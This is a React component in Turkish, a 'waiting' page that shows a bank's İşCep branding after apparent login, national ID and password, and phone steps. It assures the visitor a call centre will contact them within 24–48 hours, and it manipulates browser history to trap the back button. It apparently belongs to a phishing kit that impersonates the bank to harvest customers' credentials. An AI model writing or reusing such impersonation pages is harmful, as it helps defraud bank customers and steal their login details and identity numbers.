import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './App.css';
import { useAuth } from './AuthContext'; // AuthContext'ten useAuth'u içe aktar

function WaitingPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { dispatch: authDispatch } = useAuth(); // authDispatch'i al
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

  // Pencere boyutu değiştiğinde mobil durumu güncelle
  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  // Navigasyon ve geri tuşu kontrolü
  useEffect(() => {
    const isValidNavigation = location.state?.isValidNavigation && location.state?.from === '/telefon';
    const isCompleted = location.state?.isCompleted;

    // Geçersiz navigasyon durumunda
    if (!isValidNavigation) {
      if (isMobile) {
        setIsLoading(true);
        setTimeout(() => {
          window.history.replaceState(null, '', '/giris');
          authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
          navigate('/giris', { replace: true });
        }, 1500);
      } else {
        window.history.replaceState(null, '', '/giris');
        authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
        navigate('/giris', { replace: true });
      }
    } else if (isCompleted) {
      setIsLoading(false);

      const handlePopState = () => {
        window.history.replaceState(null, '', '/giris');
        authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
        navigate('/giris', { replace: true });
      };

      window.history.pushState(null, '', '/giris');
      window.history.pushState(null, '', '/giris');

      window.addEventListener('popstate', handlePopState);
      return () => window.removeEventListener('popstate', handlePopState);
    }
  }, [location.state, navigate, isMobile, authDispatch]); // authDispatch'i bağımlılıklara ekle

  // Mobil cihazlarda yükleme ekranı
  if (isLoading && isMobile) {
    return (
      <div className="waiting-overlay">
        <div className="waiting-container">
          <img src="/check.png" alt="Check Logo" className="waiting-logo" />
          <p className="waiting-text">Lütfen Bekleyin</p>
        </div>
      </div>
    );
  }

  // Normal bekleme sayfası içeriği
  return (
    <div className="container">
      <div className="bekleme-content">
        <img src="/iscep-logo.png" alt="İşCep Logo" className="bekleme-iscep-logo" />
        <img src="/check.png" alt="Check Logo" className="bekleme-check-logo" />
        <p className="waiting-message">
          Talebiniz başarıyla alındı.
          Çağrı Merkezimiz sizinle 24 ila 48 saat
          içinde iletişime geçecektir.
        </p>
      </div>
    </div>
  );
}

export default WaitingPage;
